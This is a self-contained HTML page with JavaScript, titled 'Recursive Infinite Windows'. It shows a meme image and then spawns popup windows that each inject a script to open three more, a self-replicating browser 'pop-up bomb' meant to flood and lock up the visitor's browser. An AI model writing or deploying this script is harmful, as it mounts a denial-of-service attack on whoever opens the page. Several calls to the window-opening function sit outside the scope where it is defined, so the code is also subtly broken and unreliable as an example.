<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recursive Infinite Windows</title>
    <script>
        window.onload = function () {
            // Display the image on the page
            var image = document.createElement('img');
            image.src = 'https://i.kym-cdn.com/entries/icons/facebook/000/038/265/rmf.jpg';
            image.alt = 'Embedded Image';
            document.body.appendChild(image);

            // After 1 second, open the initial window
            setTimeout(function () {
                // Remove the image
                image.style.display = 'none';

                // Function to create a window with recursive opening functionality
                function openRecursiveWindow() {
                    var width = 400;
                    var height = 300;

                    // Randomize the position
                    var left = Math.floor(Math.random() * (window.screen.width - width));
                    var top = Math.floor(Math.random() * (window.screen.height - height));

                    var newWindow = window.open(
                        '',
                        '_blank',
                        `width=${width},height=${height},left=${left},top=${top}`
                    );
                    if (!newWindow) {
                        alert('Pop-ups are blocked! Allow pop-ups to see the effect.');
                        return;
                    }

                    newWindow.document.title = 'Recursive Window';
                    newWindow.document.body.innerHTML = '<h1>New Recursive Window</h1>';
                    var script = newWindow.document.createElement('script');
                    script.type = 'text/javascript';
                    script.textContent = `
                        (function() {
                            function openNewWindows() {
                                var width = 400;
                                var height = 300;

                                for (var i = 0; i < 3; i++) {
                                    var left = Math.floor(Math.random() * (window.screen.width - width));
                                    var top = Math.floor(Math.random() * (window.screen.height - height));

                                    var childWindow = window.open(
                                        '',
                                        '_blank',
                                        \`width=\${width},height=\${height},left=\${left},top=\${top}\`
                                    );
                                    if (childWindow) {
                                        childWindow.document.title = 'Recursive Window';
                                        childWindow.document.body.innerHTML = '<h1>New Recursive Window</h1>';
                                        var childScript = childWindow.document.createElement('script');
                                        childScript.type = 'text/javascript';
                                        childScript.textContent = '(' + openNewWindows.toString() + ')();';
                                        childWindow.document.body.appendChild(childScript);
                                    }
                                }
                            }
                            // Trigger the creation of new windows
                            setTimeout(openNewWindows, 1000);
                             openRecursiveWindow();
                        })();
                    `;
                    newWindow.document.body.appendChild(script);
                }

                // Open the first recursive window
                openRecursiveWindow();
            }, 1000);
             openRecursiveWindow();
             openRecursiveWindow();
             openRecursiveWindow();
             openRecursiveWindow();
             openRecursiveWindow();
             openRecursiveWindow();
             openRecursiveWindow();
             openRecursiveWindow();
             openRecursiveWindow();
             openRecursiveWindow();
             openRecursiveWindow();// Wait for 1 second (1000 ms)
        };
    </script>
</head>
<body>
    <!-- Initially empty, image is dynamically added by JS -->
</body>
</html>
